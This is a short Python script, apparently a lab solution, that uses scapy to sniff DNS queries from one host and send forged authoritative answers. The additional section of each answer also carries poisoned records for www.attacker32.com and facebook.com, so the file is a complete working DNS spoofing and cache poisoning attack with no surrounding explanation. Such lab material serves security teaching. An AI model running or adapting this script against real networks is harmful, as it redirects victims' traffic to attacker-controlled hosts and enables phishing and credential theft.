#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'abc.attacker32.com' in pkt[DNS].qd.qname):
    IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    Anssec  = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                   rdata='192.168.0.101',ttl=259200)
    Addsec1 = DNSRR(rrname='www.attacker32.com', type='A',
                   ttl=259200, rdata='10.2.3.4')
    Addsec2 = DNSRR(rrname='facebook.com', type='A',
                    ttl=259200,rdata='10.2.3.5')
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1,rd=0,
                qdcount=1,qr=1,ancount=1,nscount=0,arcount=2,
                an=Anssec, ar=Addsec1/Addsec2)
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

pkt=sniff(filter='udp and (src host 10.0.2.69 and dst port 53)',
          prn=spoof_dns)

